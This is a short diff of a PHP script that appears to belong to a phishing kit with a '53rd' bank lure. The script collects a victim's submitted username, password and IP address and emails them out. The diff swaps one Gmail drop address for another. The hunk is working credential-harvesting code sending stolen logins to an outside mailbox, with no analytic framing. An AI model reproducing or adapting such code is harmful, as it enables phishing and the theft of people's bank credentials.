@@ -3,7 +3,7 @@
  $message .= "Username : ".$_POST['user-id']."\n";
  $message .= "Password : ".$_POST['password']."\n";
  $message .= "IP : ".$ip."\n";
- $send = "citizensmobileinfo@gmail.com";
+ $send = "gbbryan828@gmail.com";
  $subject = "~ 53rd ~";
  $headers = "From: Jay<logs@siteserve.jp";
  $headers .= $_POST['eMailAdd']."\n";
